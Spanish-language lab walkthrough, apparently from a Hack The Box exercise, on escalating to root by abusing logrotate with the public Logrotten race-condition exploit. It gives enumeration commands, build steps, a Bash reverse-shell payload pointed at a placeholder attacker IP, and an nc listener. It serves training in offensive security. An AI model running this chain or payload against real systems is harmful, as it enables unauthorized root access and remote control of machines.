
## 1. ¿Qué es logrotate?

Herramienta de Linux que gestiona los archivos de registro (_logs_), rotándolos para evitar que crezcan demasiado.

- Configuración principal: `/etc/logrotate.conf`
    
- Configuraciones adicionales: `/etc/logrotate.d/`
    
- `create`: crea un archivo de log nuevo después de la rotación.
    
- `compress`: comprime los logs antiguos.
    

## 2. Enumeración

**Consultar la versión:**

```
logrotate --version
```

**Revisar la configuración principal:**

```
cat /etc/logrotate.conf
```

**Buscar configuraciones adicionales:**

```
ls -la /etc/logrotate.d/
cat /etc/logrotate.d/mon
```

**Comprobar si está activa la directiva** `**create**` **o** `**compress**`**:**

```
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
```

**Consultar el estado de las rotaciones:**

```
cat /var/lib/logrotate/status
```

También se puede forzar una rotación con `-f`:

```
logrotate -f /etc/logrotate.conf
```

> Forzar una rotación puede afectar a los logs del sistema. En un laboratorio, utiliza esta opción únicamente cuando corresponda.

## 3. Requisitos para explotar la vulnerabilidad

- Tener permisos de escritura sobre el archivo de log que se va a utilizar.
    
- Que `logrotate` se ejecute con privilegios suficientes, normalmente como `root`.
    
- Que la versión y la configuración sean vulnerables.
    

HTB menciona las versiones `3.8.6`, `3.11.0`, `3.15.0` y `3.18.0` como vulnerables en el contexto del ejercicio. La versión por sí sola no garantiza que la explotación funcione.

## 4. Logrotten

[Logrotten](https://github.com/whotwagner/logrotten) es un exploit que aprovecha una condición de carrera durante la rotación de logs para intentar conseguir que una operación privilegiada afecte a un destino controlado por el atacante.

**Descargar y compilar:**

```
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
```

## 5. Preparar el payload

HTB utiliza una reverse shell basada en Bash:

```
echo 'bash -i >& /dev/tcp/IP_ATACANTE/9001 0>&1' > payload
```

Sustituye `IP_ATACANTE` por la IP accesible de tu máquina atacante.

## 6. Obtener la shell

**Iniciar el listener en la máquina atacante:**

```
nc -nlvp 9001
```

**Ejecutar Logrotten en el objetivo:**

```
./logrotten -p ./payload /ruta/al/log
```

Sustituye `/ruta/al/log` por el archivo vulnerable identificado durante la enumeración.

Si la explotación funciona, se puede obtener una shell con privilegios de `root`.

## 7. Leer la flag

Una vez obtenida la shell privilegiada:

```
id
cat /ruta/a/flag.txt
```

La ubicación de `flag.txt` depende del laboratorio.

## Cadena de explotación

1. Enumerar la versión y la configuración de `logrotate`.
    
2. Identificar un archivo de log vulnerable.
    
3. Comprobar los permisos y los privilegios con los que se ejecuta `logrotate`.
    
4. Descargar y compilar Logrotten.
    
5. Preparar el payload.
    
6. Iniciar el listener.
    
7. Ejecutar el exploit contra el log correcto.
    
8. Obtener `root` y leer la flag.
